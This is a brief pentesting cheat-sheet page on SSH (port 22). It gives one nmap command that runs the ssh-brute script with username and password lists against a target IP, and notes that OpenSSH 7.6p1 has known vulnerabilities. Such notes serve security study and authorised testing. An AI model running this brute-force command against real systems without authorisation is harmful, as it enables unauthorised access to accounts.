---
title: 22 ssh 
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - web pentesting
---

# 22 ssh


```bash
nmap 192.153.213.3 -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=/usr/share/nmap/nselib/data/passwords.lst
```

OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 is well known for some vulnerabilities.
